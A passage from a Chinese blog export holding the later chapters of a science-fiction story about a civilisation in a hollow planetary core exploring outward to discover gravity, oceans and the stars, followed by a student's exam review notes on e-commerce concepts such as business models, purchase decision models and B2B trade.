<h3 id="四、哈勃红移"><a href="#四、哈勃红移" class="headerlink" title="四、哈勃红移"></a>四、哈勃红移</h3><p>　　在泡纪元33281年的一天(这是按地球纪年法，泡世界的纪年十分古怪，你理解不了)，泡世界的岩层天空上突然出现了一个小小的洞，从洞中飞出的一堆碎岩在空中飘浮着，在放射性物质产生的微光中像一群闪烁的星星。中心城市的一队士兵立刻向小破洞飞去(记住泡世界是没有重力的)，发现这是一艘返回的探险泡船，它在八年前就出发了，谁也没有想到竟能回来。这艘泡船叫“针尖”号，它在岩层中前进了二百公里，创造了返回泡船航行距离的记录。”针尖”号出发时有二十名船员，但返回时只剩随船科学家一人了，我们就叫他哥白尼吧。船上其余的人，包括船长，都被哥白尼当食物吃掉了，事实上，这种把船员当给养的方式，是地层探险早期效率最高的航行方式。</p>
<p>　　按照严禁泡船探险的法律，以及哥白尼吃人的行为，他将在泡世界首都被处死。这天，几十万人聚集在行刑的中心广场上，等着观赏哥白尼被短路时美妙的电火花。但就在这时，世界科学院的一群科学家飘过来，公布了他们的一个重大发现：“针尖”号带回了沿途各段的岩石标本，科学家们发现，地层岩石的密度竟是随着航行距离减小的！</p>
<p>　　“你们的世界没有重力，怎么测定密度呢?”</p>
<p>　　通过惯性，比你们的方法要复杂一些。科学家们最初认为，这只是由于“针尖”号偶然进入了一个不均匀的地层区域。但在以后的一个世纪中，在不同方向上，有多艘泡船以超过”针尖”号的航行距离深入地层并返回，带回了岩石标本。人们震惊地发现，所有方向上的地层密度都是沿向外的方向渐减的，而且减幅基本一致！这个发现，动摇了统治泡世界两万多年的密实宇宙论。如果宇宙密度以泡世界为核心呈这样的递减分布，那总有密度减到零的距离，科学宗们依照巳测得的递减率，很容易计算出，这个距离是三万公里左右。</p>
<p>　　“嘿，这很像我们的哈勃红移啊！”</p>
<p>　　是很像，你们想像不出红移速度能够大于光速，所以把那个距离定为宇宙边缘：而我们的先祖却很容易知道密度为零的状态就是空间，于是新的宇宙模型诞生了，在这个模型中，沿泡世界向外，宇宙的密度逐渐减小，直至淡化为空间，这空间延续至无限。这个理论被称为太空宇宙论。</p>
<p>　　密实宇宙论是很顽固的，它的占优势地位的拥护者推出了一个打了补丁的密实宇宙论，认为密度的递减只是由于泡世界周围包裹着一层较疏松的球层，穿过这个球层，密度的递减就会停止。他们甚至计算出了这个疏松球层的厚度是二百公里。其实对这个理沦进行征实或证伪并不难，只要有一艘泡船穿过三百公里的岩层就行了。事实上，这个航行距离很快达到了，但地层密度的递减趋势仍在继续。于是，密实宇宙论的拥护者又说前面的计算有误，疏松球层的厚度应是五百公里。十年后，这个距离也被突破了，密度的递减仍在继续，而且单位距离的递减率有增加的趋势。密实派们接着把疏松球层的厚度增加到一千五百公里……</p>
<p>　　后来，一个划时代的伟大发现将密实宇宙论永远送进了坟墓。</p>
<h3 id="五、万有引力"><a href="#五、万有引力" class="headerlink" title="五、万有引力"></a>五、万有引力</h3><p>　　那艘深入岩层三百公里的泡船叫“圆刀”号，它是有史以来最大的探险泡船，配备有大功率挖掘机和完善的生存保障系统，因而它向地层深处航行的距离创造了记录。</p>
<p>　　在到达三百公里深度(或说高度)时，船上的首席科学家(我们叫他牛顿吧)向船长反映了一件不可恩议的事：当船员们悬浮在泡船中央睡觉时，醒来后总是躺在靠向泡世界方向的洞壁上。</p>
<p>　　船长不以为然地说：思乡梦游症而已。他们想回家，所以睡梦中总是向着家的方向移动。 </p>
<p>　　但泡船中与泡世界一样是没有空气的，如果移动身体就只有两方式：一是蹬踏船壁，这在悬空睡觉时是不可能的；另一种方式是喷出自己体内的排泄物作为驱动，但牛顿没有发现这类迹象。</p>
<p>　　船长仍对牛顿的话不以为然，但这个疏忽使他自己差点被活埋了。这天，向前的挖掘告一段落，由于船员十分疲劳，挖出的一堆碎岩没有立刻运到船底，大家就休息了，想等睡醒后再运。船长也与大家一样在船的正中央悬空睡觉，醒来后发现自己与其他船员一起被埋在了碎岩中！原来，在他们睡觉时，船首的碎岩与他们一起移到了靠向泡世界方向的船底！牛顿很快发现，船舱中的所有物体都有向泡世界方向移动的趋势，只是它们移动得太慢，平时觉察不出来而已。</p>
<p>　　“于是牛顿没有借助苹果就发现了万有引力！”</p>
<p>　　哪有那么容易?！但在我们的科学史上，万有引力理论的诞生比你们要艰难得多，这是我们所处的环境决定的。当牛顿发现船中的物体定向移动现象时，想当然地认为引力来自泡世界那半径三千公里的空间。于是，早期的引力理论出现了让人哭笑不得的谬误：认为产生引力的不是质量而是空间。</p>
<p>　　“能想像，在那样复杂的物理环境中，你们牛顿的思维比我们的牛顿可要复杂多了。”是的，直到半个世纪后，科学家们才拨开迷雾，真正认清了引力的本质，并用与你们相似的仪器测定了万有引力常数。引力理论获得承认也经历了一个漫长的过程，但一旦意识到引力的存在，密实宇宙论就完了，引力是不允许无限固体宇宙存在的。</p>
<p>　　太空宇宙论得到最终承认后，它所描述的宇宙对泡世界产生了巨大的诱惑力。在泡世界，守恒的物理量除了能量和质量外，还有空间。泡世界的空间半径只有三千公里，在岩层中挖洞增大不了空间，只是改变空间的位置和形状而已。同时，由于失重，地核文明是悬浮在空间中，而不是附着在洞壁(相当于你们的土地)上，所以在泡世界，空间是最保贵的东西，整个泡世界文明史，就是一部血腥的空间争夺史。而现在惊闻空间可能是无限的，怎能不令人激动！于是，从此出现了前所未有的探险浪潮，数量众多的泡船穿过地层向外挺进，企图穿过太空宇宙论预言的三万二千公里的岩层，到达密度为零的天堂。</p>
<h3 id="六、地核世界"><a href="#六、地核世界" class="headerlink" title="六、地核世界"></a>六、地核世界</h3><p>　　说到这里，如果你足够聪明，应该能够推测出泡世界的真相了。</p>
<p>　　“你们的世界，是不是位于一个星球的地心?”正确，我们的行星大小与地球差不多，半径约八千公里。但这颗行星的地核是空的，空核的半径约为三千公里，我们就是地核中的生物。</p>
<p>　　不过，发现万有引力后，我们还要过许多个世纪才能最后明白自己世界的真相。</p>
<h3 id="七、地层战争"><a href="#七、地层战争" class="headerlink" title="七、地层战争"></a>七、地层战争</h3><p>　　太空宇宙论建立后，追寻外部无限空间的第一个代价却是消耗了泡世界的有限空间，众多的泡船把大量的碎岩排入地核空间，这些碎岩悬浮在城市周圈，密密麻麻，无边无际，以至于使得原来可以自由漂移的城市动弹不得，因为城市一旦移动，就将遭遇毁灭性的密集石雨。这些被碎岩占掉的空间，至少有一半永远无法恢复。</p>
<p>　　这时的元老院已由泡世界政府代替，作为地核空间的管理者和保卫者，疯狂的泡船探险受到了政府严厉地镇压。但最初这种镇压效率并不高，因为当得知探险行为发生时，泡船早已深入地层了。所以政府很快意识到，制止泡船的最好工具就是泡船。于是，政府开始建立庞大的泡船舰队，深入岩层拦截探险泡船，追回被它们盗走的空间。这种拦截行动自然遭到了探险泡船的抵抗，于是，地层中爆发了一场旷日持久的战争。</p>
<p>　　“这种战争真的很有意思！”也很残醣。首先，地层战争的节奏十分缓慢，因为以那个时代的掘进技术，泡船在地层中的航行速度一般只有每小时三公里左右。地层战争推祟巨舰主义，因为泡船越大，续航能力越强，攻击力也更强大。但不管多大的地层战舰，其横截面都应尽可能的小，这样可以将挖掘截面藏到最小，以提高航行速度。所以，所有泡船的横截面都是一样的，大小只在于其长短。大型战舰的形状就是一条长长的隧道。由于地层战场是三维的，所以其作战方式类似于你们的空战-但要复杂得多。当战舰接触敌舰发起攻击时，首先要快速扩大舰首截面，以增大攻击面积，这时的攻击舰就变成了一根钉子的形状。必要时，泡舰的舰首还可以形成多个分支，像一只张开的利爪那样，从多个方向攻击敌舰。地层作战的复杂性还表现在：每一艘战舰都可以随意分解成许多小舰，多艘战舰又可以快速组合成一艘巨舰。所以当两支敌对舰队相遇时，是分解还是组合，是一门很深的战术学问。</p>
<p>　　地层战争对于未来的探险并非只有负面作用，事实上，在战争的刺激下，泡世界发生了技术革命。除了高效率的掘进机器外，还发明了地震波仪，它既可用于地层中的通讯，又可用作雷达探测，强力的震波还可作为武器。最精致的震波通讯设备甚至可以传送图像。</p>
<p>　　地层中曾出现过的最大战舰是”线世界”号，它是泡世界政府建造的。当处于常规航行截面时，”线世界”号的长度达一百五十公里，正如舰名所示，相当于一个长长的小世界了。身处其中，有置身于你们的英伦海底隧道的感觉，每隔几分钟，隧道中就有一列高速列车驶过，这是向舰尾运送掘进碎石的专列。”线世界”号当然可以分解成一支庞大的舰队，但它大部分时间还是以整体航行的。</p>
<p>　　“线世界”号并非总是呈直线形，在进行机动航行时，它那长长的舰体隧道可能形成一团自相贯通或交叉的、十分复杂的曲线。”线世界”号拥有最先进的掘进机，巡航速度是普通泡舰的一倍，达到每小时六公里，作战速度可以超过每小时十公里！它还拥有超高功率的震波雷达，能够准确定位五百公里外的泡船；它的震波武器可以在一千米的距离上粉碎目标泡船内的一切物体。这艘超级巨舰在广阔的地层中纵横驰骋，所向披靡，消灭了大量的探险泡船，并每隔一段时间将吞并的探险泡船空间送还泡世界。</p>
<p>　　在“线世界”号的毁灭性打击下，泡世界向外部的探险一度濒于停顿。在地层战争中，探险者们始终处于劣势，他们不能建造或组合长于十公里的战舰，因为在地层中这样的目标极易被”线世界”号上或泡世界基地中的雷达探测定位，进而被迅速消灭。但是，要使探险事业继续下去，就必须消灭”线世界”号。经过长时间的筹划，探险联盟集结了一百多艘地层战舰围歼”线世界”号，这些战舰中最长的也只有五公里。战斗在泡世界向外一千五百公里处展开，史称一千五百公里战役。</p>
<p>　　探险联盟首先调集二十艘战舰，在一千五百公里处组合成一艘长达三十公里的巨舰，引诱”线世界”号前往攻击。当”线世界”号接近诱饵，成一条直线高速冲向目标时，探险联盟埋伏在周围的上百艘战舰沿与”线世界”号垂直的方向同时出击，将这艘一百五十公里长的巨舰截为五十段。”线世界”号被截断后分裂出来的五十艘战舰仍具有很强的战斗力，双方的二百多艘战舰缠斗在一起，在地层中展开了惨烈的大混战。战舰空间在不断地组合分化，渐渐已分不清彼此。在战役的最后阶段，半径达二百公里的战场巳成了蜂窝状，就在这个处于星球地下三千五百公里深处的错综复杂的三维迷宫中，到处都是短兵相接的激战。在这个位置，星球的重力已经很明显，而与政府军相比，探险者对重力环境更为熟悉。在迷宫内宏大的巷战中，这微弱的优势渐渐起了决定性的作用，探险联盟取得了最后胜利。 </p>
<h3 id="八、海"><a href="#八、海" class="headerlink" title="八、海"></a>八、海</h3><p>　　战役结束后，探险者联盟将战场的所有空间合为一体，形成了一个半径为五十公里的球形空间。</p>
<p>　　就在这个空间中，探险联盟宣布脱离泡世界独立。</p>
<p>　　独立后的探险联盟与泡世界的探险运动遥相呼应，不断地有探险泡船从地核来到联盟，他们带来的空间使联盟领土的体积不断增大，使得探险者们在一千五百公里高度获得了一个前进基地。被漫长的战争拖得筋疲力尽的世界政府再也无力阻止这一切，只得承认探险运动的合法性。</p>
<p>　　随着高度的增加，地层的密度也逐渐降低，使得掘进变得容易了；另外重力的增加也使碎岩的处理更加方便。以后的探险变得顺利了许多。在战后第八年，就有一艘名叫“螺旋”号的探险泡船走完了剩下的三千五百公里航程，到达了距泡世界边缘——也就是距量球中心八千公里、距泡世界边缘五千公里的高度。</p>
<p>　　“哇，那就是到达星球的表面了！你们看到了大平原和真正的山脉，这太激动人心了！”没什么可激动的，”螺旋”号到达的是海底。</p>
<p>　　“……”</p>
<p>　　当时，震波通讯仪的图像摇了几下就消失了，通讯完全中断。在更低高度的其他泡船监听到了一个声音，转换成你们的空气声音就是”剥”的一声，这是高压海水在瞬间涌入“螺旋”号空间时发出的。泡世界的机械生命和船上的仪器设备是绝对不能与水接触的，短路产生的强大电流迅速汽化了渗入人体和机器内部的海水，“螺旋”号的乘员和设备在海水涌入的瞬间郝像炸弹一样爆裂了。</p>
<p>　　接着，联盟又向不同的方向发出了十多艘探险泡船，但都在同样的高度遇到了同样的事情。除了那神秘的”剥”的一声，再没有传回更多的信息。</p>
<p>　　有两次，在监视屏幕上看到了怪异的晶状波动，但不知道那是什么。跟随的泡船向上方发出的雷达震波也传回了完全不可理解的回波，那回波的性质既不是空间也不是岩层。</p>
<p>　　一时间，太空宇宙论动摇了，学术界又开始谈论新的宇宙模型，新的理论将宇宙半径确定为八千公里，认为那些消失的探险船接触了宇宙的边缘，没入了虚无。</p>
<p>　　探险运动面临着严峻的考验，以往无法返回的探险泡船所占用的空间，从理论上说还是有希望回收的，但现在，泡船一旦接触宇宙边缘，其空间可能永远损失了。到这一步，连最坚定的探险者都动摇了，因为在这个地层中的世界，空间是不可再生的。联盟决定，再派出最后五艘探险泡船，在接近五千米高度时以极慢速上升。如果发生同样的不测，就暂停探险运动。</p>
<p>　　又损失了两艘泡船后，第三艘“岩脑”号取得了突破性的进展。在五千米高度上，”岩脑”号以极慢的速度小心翼翼地向上掘进，接近海底时，海水并没有像以前那样压塌船顶的岩层瞬间涌入，而是通过岩层上的一道窄裂缝呈一条高压射流喷射进来。”岩脑”号在航行截面上长二百五十米，在高地层探险船中算是体积较大的，喷射进来的海水用了近一小时才充满船的空间。在触水爆裂前，船上的震波仪记录了海水的形态，并将数据和图像完整地发回联盟。就这样，地核人第一次见到了液体。</p>
<p>　　泡世界的远古时代可能存在过液体，那是炽热的岩浆，后来星球的地质情况稳定了，岩浆凝固，地核中就只有固体了。有科学家曾从理论上预言过液体的存在，但没人相信宇宙中真有那种神话般的物质。现在，从传回的图像中人们亲眼看到了液体。他们震惊地看着那道白色的射流，看着水面在船内空间缓缓上升，看着这种似乎违反所有物理法则的魔鬼物质适应着它的附着物的任何形状，渗入每一道最细微的缝隙；岩石表面接触它后似乎改变了性质，颜色变深了，反光性增强了；最让他们感兴趣的是：大部分物体都会沉入这种物质中，但有部分爆裂的人体和机器碎片却能浮在其液面上！而这些碎片的性质与那些沉下去的没有任何区别。地核人给这种液体物质起了一个名字，叫无形岩。</p>
<p>　　以后的探索就比较顺利了。探险联盟的工程师们设计了一种叫引管的东西，这是一根长达二百米的空心钻杆，当钻透岩层后，钻头可以像盖子那样打开，以将海水引入管内，管子的底部有一个阀门。携带引管和钻机的泡船上升至五千米高度后，引管很顺利地钻透岩层伸入海底。钻探毕竟是地核人最熟悉的技术，但另一项技术他们却一无所知，那就是密封。由于泡世界中没有液体和气体，所以也没有密封技术。引管底部的阀门很不严实，没有打开阀门，海水已经漏了出来。</p>
<p>　　事后证明这是一种幸运，因为如果将阀门完全打开，冲入的高压海水的动能将远大于上次从细小的裂缝中渗入的，那道高压射流会像一道激光那样切断所遇到的一切。现在从关闭的阀门渗入的水流却是可以控制的。你可以想像，泡船中的探险者们看着那一道道细细的海水在他们眼前喷出，是何等震撼啊。</p>
<p>　　他们这时对于液体，就像你们的原始人对于电流那样无知。在用一个金属容器小心翼翼地接满一桶水后，泡船下降，将那根引管埋在岩层中。在下降的过程中，探险者们万分谨慎地守护着那桶作为研究标本的海水，很快又有了一个新的发现：无形岩居然是透明的！上次裂缝中渗入的海水由于混入了沙土，使他们没有发现这一点。随着泡船下降深度的增加，温度也在增加，探险者们惊恐地看到，无形岩竟是一种生命体！它在活过来，表面愤怒地翻滚着，呈现由无数涌泡构成的可怕形态。但这怪物在展现生命力的同时也在消耗着自己，化做一种幽灵般的白色影子消失在空中。当桶中的无形岩都化做白色魔影消失后，船舱中的探险者们相继感到了身体的异常，短路的电火花在他们体内闪烁，最后他们都变成一团团焰火，痛苦地死去了。联盟基地中的人们通过监视器传回的震波图像看到了这可怕的情景，但监视器也很快短路停机了。前去接应的泡船也遭遇了同样的命运，在与下降的泡船对接后，接应泡船中的乘员也同样短路而死，仿佛无形岩化做了一种充满所有空间的死神。但科学家们也发现，这一次的短路没有上一次那么剧烈，他们得出结论：随着空间体积的增加，无形死神的密度也在降低。接下来，在付出了更多的生命代价后，地核人终于又发现了一种他们从未接触过的物质形态：气体。</p>
<h3 id="九、星空"><a href="#九、星空" class="headerlink" title="九、星空"></a>九、星空</h3><p>　　这一系列的重大发现终于打动了泡世界的政府，使其与昔日的敌人联合起来，也投身于探险事业之中，一时间，对探险的投入急剧增加，最后的突破就在眼前。</p>
<p>　　虽然对水蒸气的性质有了越来越多的了解，但缺乏密封技术的地核科学宗一时还无法避免它对地核人生命和仪器设备的伤害。不过他们已经知道，在四千五百米以上的高度，无形岩是死的，不会沸腾。于是，地核政府和探险联盟一起在四千八百米的高度上建造了一所实验室，装配了更长、性能更好的引管，专门进行无形岩的研究。</p>
<p>　　“直到这时，你们才开始做阿基米德的工作。”是的，可你不要忘记，我们在原始时代，就做了法拉第的工作。</p>
<p>　　在无形岩实验室中，科学家们相继发现了水压和浮力定律，同时与液体有关的密封技术也得以发展和完善。人们终于发现，在无形岩中航行，其实是一件十分简单的事，比在地层中航行要容易得多。只要船体的密封和耐压性达到要求，不需任何挖掘，船就可以在无形岩中以令人难以想像的高速度上升。</p>
<p>　　“这就是泡世界的火箭了。”应该称做水箭。水箭是一个蛋形耐高压金属容器，没有任何动力设施，内部仅可乘坐一名探险者，我们就叫他泡世界的加加林吧。水箭的发射平台位于五千米高度，是在地层中挖出的一个宽敞的大厅。在发射前的一小时，加加林进入水箭，关上了密封舱门。确定所有仪器和生命维持系统正常后，自动掘进机破坏了大厅顶部厚度不到十米的薄岩层，随着”轰隆”一声，岩层在上方无形岩的巨大压力下坍塌了，水箭浸没于深海的无形岩之中。</p>
<p>　　周围的尘埃落定后，加加林透过由金刚石制造的透明舷窗，惊奇地发现发射平台上的两盏探照灯在无形岩中打出了两道光柱，由于泡世界中没有空气，光线不会散射，这时地核人第一次看到了光的形状。震波仪传来了发射命令，加加林扳动手柄，松开了将水箭锚固定在底部岩层上的铰链，水箭缓缓升离了海底，在无形岩中很快加速，向上浮去。</p>
<p>　　科学家们按照海底压力，很容易计算出了上方无形岩的厚度，约一万米，如无意外，上浮的水箭能够在十五分钟内走完这段航程，但以后会遇到什么，谁都不知道。</p>
<p>　　水箭在一片寂静中上升着，透过舷窗看出去，只有深不见底的黑暗。偶尔有几粒悬浮在无形岩中的尘埃在舷窗透出的光亮中飞速掠过，标示着水箭上升的速度。</p>
<p>　　加加林很快感到一阵恐慌，他是生活在固体世界中的生命，现在第一次进入了无形岩的空间，一种无依无靠的虚无感攫住了他的全部身心。十五分钟的航程是那么漫长，它浓缩了地核文明十万年的探索历程，仿佛永无止境……就在加加林的精神即将崩溃之际，水箭浮上了这颗行星的海面。</p>
<p>　　上浮惯性使水箭冲上了距海面十几米的空中，在下落的过程中，加加林从舷窗中看到了下方无形岩一望无际的广阔表面，这巨大的平面上波光粼粼，加加林并没有时间去想这表面反射的光来自哪里。水箭重重地落在海面上，飞溅的无形岩白花花一片撒落在周围，水箭像船一样平稳地浮在海面上，随波浪轻轻起伏着。</p>
<p>　　加加林小心翼翼地打开舱门，慢慢探出身去，立刻感到了海风的吹拂，过了好一阵儿，他才悟出这是气体。恐惧使他战栗了一下，他曾在实验室中的金刚石管道中看到过水汽的流动，但宇宙中竟然有如此巨量的气体存在，是任何人都始料未及的。</p>
<p>　　加加林很快发现，这种气体与无形岩沸腾后转化的那种不同，不会导致肌体的短路。他在以后的回忆录中有过一段这样的描述：我感到这是一只无形巨手温柔的抚摸，这巨手来自一个我们不知道的无限巨大的存在，在这个存在面前，我变成了另一个全新的我。</p>
<p>　　加加林抬头望去，这时，地核文明十万年的探索得到了最后的报偿。</p>
<p>　　他看到了灿烂的星空。 </p>
<h3 id="十、山无处不在"><a href="#十、山无处不在" class="headerlink" title="十、山无处不在"></a>十、山无处不在</h3><p>　　“真是不容易，你们经历了那么长时间的探索，才站到我们的起点上。”冯帆赞叹道。</p>
<p>　　所以，你们是一个很幸运的文明。</p>
<p>　　这时，逃逸到太空中的大气形成的冰晶云面积扩大了很多，天空一片晶亮，外星飞船的光芒在冰晶云中散射出一圈绚丽的彩虹。下面，大气旋形成的巨井仍在轰隆隆地旋转着，像是一台超级机器在一点点碾碎这个基球。而周围的山顶却更加平静，连碎波都没有了，海面如镜，又让冯帆想起了藏北的高山湖泊……冯帆强迫自己，使思想回到了现实。</p>
<p>　　“你们到这里来干什么?”他问。</p>
<p>　　我们只是路过，看到这里有智慧文明，就想找人聊聊，谁先登上这座山顶我们就和谁聊。</p>
<p>　　“山在那儿，总会有人去登的。”</p>
<p>　　是，登山是智慧生物的一个本性，他们都想站得更高些，看得更远些，这并不是生存的需要。比如你，如果为了生存就会远远逃离这山，可你却登上来了。进化赋予智慧文明登高的欲望是有更深的原因的，这原因是什么我们还不知道。山无处不在，我们都还在山脚下。</p>
<p>　　“我在山顶上。”冯帆说，他不容别人挑战自己登上世界最高峰的荣誉，即使是外星人。</p>
<p>　　你在山脚下，我们都在山脚下。光速是一个山脚，空间是一个山脚，被禁锢在光速和空间这狭窄的深谷中，你不觉得……憋屈吗?”生来就这样，习惯了。”那么，我下面要说的事你会很不习惯的。看看这个宇宙，你感觉到什么?“广阔啊，无限啊，这类的。”你不觉得憋屈吗?”怎么会呢?宇宙在我眼里是无限的，在科学家们眼里，好像也有二百亿光年呢。”那我告诉你，这是一个二百亿光年半径的泡世界。</p>
<p>　　“……”</p>
<p>　　我们的宇宙是一个空泡，一块更大固体中的空泡。</p>
<p>　　“怎么可能呢?这块大固体不会因引力而坍缩吗?”至少目前还没有，我们这个气泡还在超固体块中膨胀着。引力引起坍缩是对有限的固体块而言的，如果包裹我们宇宙的这个固体块是无限的，就不存在坍缩问题。当然，这只是一种猜测，谁也不知道那个固体超宇宙是不是有限的。有许多种猜测，比如认为引力在更大的尺度上被另一种力抵消，就像电磁力在微观尺度上被核力抵消一样，我们意识不到这种力，就像处于泡世界中意识不到万有引力一样。从我们收集到的资料上看，对于宇宙的气泡形状，你们的科学家也有所猜测，只是你不知道罢了。</p>
<p>　　“那块大固体是什么样子的?也是……岩层吗?”不知道，五万年后我们到达目的地时才能知道。</p>
<p>　　“你们要去哪里?”宇宙边缘，我们是一艘泡船，叫”针尖”号，记得这名字吗?”记得，它是泡世界中首先发现地层密度递减律的泡船。”对，不知我们能发现什么。</p>
<p>　　“超固体宇宙中还有其他的空泡吗?”你已经想得很远了。</p>
<p>　　“这让人不能不想。”想想一块巨岩中的几个小泡泡，就是有，找到它们也很难，但我们这就去找。</p>
<p>　　“你们真的很伟大。”好了，聊得很愉快，但我们还要赶路，五万年太久，只争朝夕。认识你很高兴，记往，山无处不在。</p>
<p>　　由于冰晶云的遮拦，最后这行字已经很模糊。</p>
<p>　　接着，太空中的巨型屏幕渐渐暗下来，巨球本身也在变小，很快缩成一点，重新变成星海中一颗不起眼的星星，这变化比它出现时要快许多。这颗星星在夜空中疾驶而去，转眼消失在西方天际。</p>
<p>　　海天之间黑了下来，冰晶云和风暴巨井都看不见了，天空中只有一片黑暗的混沌。冯帆听到周围风暴的轰鸣声在迅速减小，很快变成了低声的呜咽，再往后完成消失了，只能听到海浪的声音。</p>
<p>　　冯帆有了下坠的感觉，他看到周围的海面正在缓缓地改变着形状，海山浑圆的山顶在变平，像一把正在撑开的巨伞一样。他知道，海水高山正在消失，他正在由九千米高空向海平面坠落。在他的感觉中只有两三分钟，他漂浮的海面就停止了下降，他知道这点，是由于自己身体下降的惯性使他没入了巳停降的海面之下，好在这次沉得并不深，他很快游了上来。</p>
<p>　　周围已是正常的海面，海水高山消失得无影无踪，仿佛从来就没有存在过一样。风暴也完全停止了，风暴强度虽大但持续时间很短，只是刮起了表层浪，所以海面也在很快平静下来。</p>
<p>　　天空中的冰晶云已经散去很多，灿烂的星空再次出现了。</p>
<p>　　冯帆仰望着星空，想像着那个遥远的世界，真的太远了，连光都会走得疲惫，那又是很早以前，在那个海面上，泡世界的加加林也像他现在这样仰望着星空。穿越广漠的时空荒漠，他们的灵魂相通丁。</p>
<p>　　冯帆一阵恶心，吐出了些什么，凭嘴里的味道他知道是血，他在九千米高的海山顶峰得了高山病，肺水肿出血了，这很危险。在突然增加的重力下，他虚弱得动弹不得，只是靠救生衣把自己托在水面上。不知道蓝水号现在的命运，但基本上可以肯定，方圆一千公里内没有船了。</p>
<p>　　在登上海山顶峰的时候，冯帆感觉此生足矣，那时他可以从容地去死。但现在，他突然变成了世界上最怕死的人。他攀登过岩石的世界屋脊，这次又登上了海水构成的世界最高峰，下次会登什么样的山呢?这无论如何得活下去才能知道。几年前在珠峰雪暴中的感觉又回来了，那感觉曾使他割断了连接同伴和恋人的登山索，将他们送进了死亡世界，现在他知道自己做对了。如果现在真有什么可背叛的东西来拯救自己的生命，他会背叛的。</p>
<p>　　他必须活下去，因为山无处不在。 </p>
]]></content>
      <categories>
        <category>阅读</category>
      </categories>
      <tags>
        <tag>科幻</tag>
      </tags>
  </entry>
  <entry>
    <title>电子商务2023 期末复习</title>
    <url>/2024/12/15/%E7%94%B5%E5%AD%90%E5%95%86%E5%8A%A1-%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<h4 id="电子商务"><a href="#电子商务" class="headerlink" title="电子商务"></a>电子商务</h4><ol>
<li><p>狭义电子商务 EC：通过包括互联网在内的计算机网络，实现商品买卖、交换、配送、服务信息的过程</p>
</li>
<li><p>广义电子商务 EB：不仅仅指商品、服务的买卖，也包括客户服务、与商业伙伴的协调合作、利用网络开展学习活动、组织内部的电子信息交换</p>
</li>
<li><p>不同：EC主要指售前、售中、售后活动中的售中活动，EB包括售前、售中、售后的全部活动</p>
</li>
<li><p>电子商务&#x3D;电子+商务，是商务的电子化，是以电子的形式实现新的商业模式，是对商业模式的创新；商务是源、业务、目的，电子是技术、手段、工具</p>
</li>
<li><p>电子商务涉及商品、参与者、交易三个过程，三个维度都数字化的称为完全电子商务，有一个维度不是数字化，但也有维度数字化的叫不完全电子商务</p>
</li>
</ol>
<span id="more"></span>

<ol start="6">
<li><p>电子商务的框架：</p>
<ul>
<li>应用层：各种具体的电子商务应用</li>
<li>支持领域：人、公共政策、市场营销与广告、支持服务、业务伙伴</li>
<li>基础设施：包括软件、硬件、网络</li>
</ul>
</li>
<li><p>电子商务分类：B2B、B2C、B2B2C、B2E、C2C、C2B、企业内电子商务、协同商务、电子政务</p>
</li>
<li><p>推动电子商务发展的动力来源：数字化革命和商业环境变化</p>
</li>
</ol>
<h4 id="商业模式"><a href="#商业模式" class="headerlink" title="商业模式"></a>商业模式</h4><ol>
<li>商业模式：指一个完整的产品、服务和信息流体系，包含每一个参与者和其在其中的作用，以及每个参与者的潜在利益和对应的收益来源和方式，是企业实施其赖以生存的业务活动的方法，决定了企业在价值链中的位置。</li>
<li>商业模式主要关注：企业在市场中与用户、供应商、其他合作的关系，尤其是彼此间的物流、信息流、资金流。</li>
<li>商业模式主要要素：消费者目标群体、收入模型、价值主张、分销渠道、客户关系、企业内部价值链、核心能力、成本结构、合作伙伴网络</li>
<li>商业模式核心要素：价值主张、收入模型、企业内部价值链</li>
<li>原子商业模式：在线直销、网络招投标平台、电子市场和电子交易、病毒直销、团购</li>
<li>原子商业模式是商业模式的基本单位，包括了商业模式的要素，综合商业模式由一个以上的原子商业模式组成。</li>
</ol>
<h4 id="购物决策"><a href="#购物决策" class="headerlink" title="购物决策"></a>购物决策</h4><ol>
<li><p>传统购物决策模型：</p>
<ul>
<li>需求识别：决定买什么</li>
<li>信息收集：收集各种满足需求的信息</li>
<li>产品、商家评估：筛选备选产品，建立评估标准活动，（谈判）</li>
<li>购买与配送：做出购买决策，支付，配送</li>
<li>购后行为：售后服务与评价</li>
</ul>
</li>
<li><p>对于一次特定的购买决策，这5个阶段不一定都存在，因为阶段不一定完整，可能跳过或重复某个阶段，顺序可能颠倒，任何时刻可能结束过程。</p>
</li>
<li><p>其他常见购买决策模型：</p>
<ul>
<li>AIDA：Attention引起注意 Interest诱发兴趣 Desire&amp;Decision刺激购买欲望并作出购买决策 Action促成购买</li>
<li>AIDAS：+Satisfaction 达成满意，客户产生忠诚度，可能重复购买</li>
<li>AISAS：Attention -&gt; Interest -&gt; Search 搜索 -&gt; Action -&gt; Satisfaction&amp;Shared 分享</li>
</ul>
</li>
<li><p>影响个人消费者决策过程的因素：</p>
<ul>
<li>不可控因素：消费者特征、环境特征、零售商和中间商特征</li>
<li>可控因素：产品和服务特征、电子商务系统（支付和物流、网站特征、客服）</li>
</ul>
</li>
<li><p>消费者购物决策过程中的角色和作用：</p>
<ul>
<li>发起人：第一个提出或想到要购买特定产品和服务的人</li>
<li>影响人：其建议或观点对最终决策起重要作用的人</li>
<li>决定者：最终做出购买决策、或对购物中某个环节做出决策的人</li>
<li>购买者：执行购买行为者</li>
<li>用户：最终使用产品或服务的人</li>
</ul>
</li>
</ol>
<h4 id="B2B"><a href="#B2B" class="headerlink" title="B2B"></a>B2B</h4><ol>
<li><p>B2B电子商务是指企业与供应商之间，通过网络开展的交易活动</p>
</li>
<li><p>B2B主要特征：企业通过网络开展自动化交易，或是通过网络进行沟通协作，目的是对经营管理的持续优化</p>
</li>
<li><p>推动B2B的商业因素：降低成本；提升竞争优势；协调与供应商、客户的关系；减少履约延误；利用先进技术整合企业内部和企业之间的各种系统</p>
</li>
<li><p>B2B交易活动的类型：</p>
<ul>
<li>卖方模式：一个卖家对应多个买家</li>
<li>买方模式：一个买家对应多个卖家</li>
<li>多方交易：多对多</li>
<li>协同商务模式：企业之间进行除买卖之外的活动</li>
</ul>
</li>
<li><p>B2B电子市场和服务的基本类型：</p>
<ul>
<li>一对多和多对一</li>
<li>多对多交易 </li>
<li>供应链优化与协同商务：除买卖商品外，还存在其他合作</li>
</ul>
</li>
<li><p>B2B交易平台一般需要提供的功能&#x2F;电子交易所的功能：</p>
<ul>
<li>匹配功能：撮合买方和卖方</li>
<li>为交易提供便利</li>
<li>指定交易规则、维护交易平台基础设施</li>
</ul>
</li>
<li><p>B2B交易商品的类型：直接物料，直接用以生产的物料；间接物料：生产、经营活动的辅助物料</p>
</li>
<li><p>B2B交易类型：实时采购；战略采购</p>
</li>
